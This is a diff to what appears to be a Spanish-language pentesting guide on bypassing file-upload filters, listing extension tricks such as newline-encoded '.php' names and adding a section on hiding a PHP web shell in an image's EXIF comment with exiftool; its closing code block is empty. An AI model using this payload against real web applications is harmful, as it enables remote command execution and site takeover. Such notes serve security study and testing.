@@ -58,3 +58,16 @@ En ocasiones se podría utilizar las extensiones anteriores de la siguiente mane
 - _file.php%0a.png_
 - _file.php%0d%0a.png_
 - _file.phpJunk123png_
+
+### Esconder PHP en imagen
+Lo primero que necesitamos es la imagen que vamos a utilizar para cargar la Shell. Una vez descargada, comenzamos a modificarla.
+
+El comando para ello es:
+```bash
+exiftool -Comment='<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ nombre_imagen.extensión
+```
+
+luego nos vamos a la url, buscamos la imagen y ponemos:
+```bash
+
+```
